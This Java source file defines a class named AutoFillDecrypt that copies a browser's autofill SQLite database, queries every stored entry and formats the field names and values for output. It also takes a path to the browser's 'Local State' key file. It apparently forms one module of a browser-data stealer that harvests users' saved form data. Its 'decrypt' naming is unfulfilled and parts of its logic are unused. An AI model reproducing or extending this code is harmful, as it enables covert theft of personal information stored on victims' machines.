package _256.utils.decrypt.autofill;

import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.UUID;

import org.apache.commons.io.FileUtils;

public class AutoFillDecrypt {

	private File CARD_PATH = null;
	private File LOCAL_STATE_PATH = null;
	public List<String> AUTOFILL;

	public AutoFillDecrypt(String path0, String path1) {
		this.CARD_PATH = new File(path0);
		this.LOCAL_STATE_PATH = new File(path1);
		this.AUTOFILL = new ArrayList<String>();
	}

	public String getData() {
		StringBuilder temp = new StringBuilder();
		AUTOFILL.stream().forEach(autofill -> temp.append(autofill + "\n"));
		return temp.toString();
	}

	public AutoFillDecrypt getAutoFill() {
		HashSet<AutoFill> AUTOFILL = new HashSet<>();
		Connection connection = null;
		File tempFile = null;
		try {
			tempFile = new File(UUID.randomUUID().toString());
			FileUtils.copyFile(this.CARD_PATH, tempFile);
			Class.forName("org.sqlite.JDBC");
			connection = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
			Statement statement = connection.createStatement();
			statement.setQueryTimeout(30);
			ResultSet resultSet = statement.executeQuery("SELECT * FROM autofill");
			while (resultSet.next()) {
				parseCards(tempFile, "", AUTOFILL, resultSet);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		} finally {
			try {
				if (connection != null) {
					connection.close();
				}
			} catch (Exception e) {
			}
		}
		tempFile.delete();
		return this;
	}

	private void parseCards(File autoFillStore, String name, HashSet<AutoFill> autoFillSet, ResultSet resultSet) throws SQLException {
		String nameSite = resultSet.getString(1);
		String value = resultSet.getString(2);
		if (name != null) {
			String format = "Title: " + nameSite + "\nValue: " + value + "\n";
			AUTOFILL.add(format);
		}
	}
}
